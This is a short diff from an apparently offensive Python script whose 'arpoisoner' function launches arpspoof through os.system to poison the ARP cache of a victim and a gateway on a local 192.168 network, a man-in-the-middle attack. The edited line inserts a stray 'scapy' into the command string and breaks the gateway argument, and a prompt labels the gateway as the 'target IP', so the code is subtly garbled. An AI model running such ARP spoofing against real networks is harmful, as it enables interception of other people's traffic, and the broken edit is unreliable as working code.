@@ -13,7 +13,7 @@ def arpoisoner(out_lck):
 
     gatewayip = loop_input(out_lck, "Please insert target IP: ")
 
-    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % ("enx9cebe811a79a", "192.168." + victimip, "192.168." + gatewayip))
+    os.system("xterm -e \"arpspoof -i %s -t %s  scapy%s\"" % ("enx9cebe811a79a", "192.168." + victimip, "192.168." + gatewayip))
 
 
 def lel(array, out_lck):
